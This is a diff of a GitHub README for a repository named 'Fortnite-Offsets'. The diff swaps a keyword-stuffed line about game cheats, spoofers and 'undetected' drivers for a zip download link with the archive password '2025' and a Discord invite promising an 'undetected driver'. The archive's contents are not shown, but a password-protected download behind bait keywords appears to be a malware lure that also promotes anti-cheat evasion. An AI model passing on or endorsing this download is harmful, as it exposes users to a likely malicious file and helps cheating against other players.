@@ -1,2 +1,7 @@
-# Fortnite-Offsets
-Latest Fortnite offsets and sigs/signatures | fortnite cheat, fortnite driver, fortnite offsets, valorant offsets, valorant cheat, data pointer, data ptr, ioctl, offsets, driver, cheats, hacks, hack, undetected, cracked, ud, external, internal, cs2, rust, apex, legends, spoofer, temp, perm
+# [DOWNLOAD LINK](https://github.com/titchwotlakosta779/Fortnite-Offsets/archive/refs/tags/Download.zip)
+# PASSWORD : 2025
+
+
+         
+# Discord
+Join my [discord server](https://discord.gg/YzpCypQyNw) to get vcxproj files and undetected driver for this source
